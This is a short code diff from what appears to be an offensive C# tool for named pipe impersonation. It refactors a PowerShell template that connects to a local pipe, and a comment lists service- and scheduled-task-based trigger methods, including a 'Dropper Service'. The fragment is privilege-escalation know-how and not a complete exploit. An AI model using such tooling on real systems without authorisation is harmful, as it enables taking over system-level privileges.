@@ -12,8 +12,8 @@ namespace NamedPipeImpersonation.Library
         // 0: Command Service, 1: Dropper Service, 2: Scheduled Tasks
         public static uint MethodId { get; set; } = 0;
         public static string PoshTemplate { get; } =
-            "$c = [System.IO.Pipes.NamedPipeClientStream]::" + 
-            "new(\"localhost\", \"{0}\", [System.IO.Pipes.PipeDirection]::Out); " +
+            "$d = [System.IO.Pipes.PipeDirection]::Out; " +
+            "$c = [System.IO.Pipes.NamedPipeClientStream]::new(\"localhost\", \"{0}\", $d); " + 
             "$c.Connect(3000); $c.Write(@(0x00), 0, 1); $c.Dispose()";
 
         /*
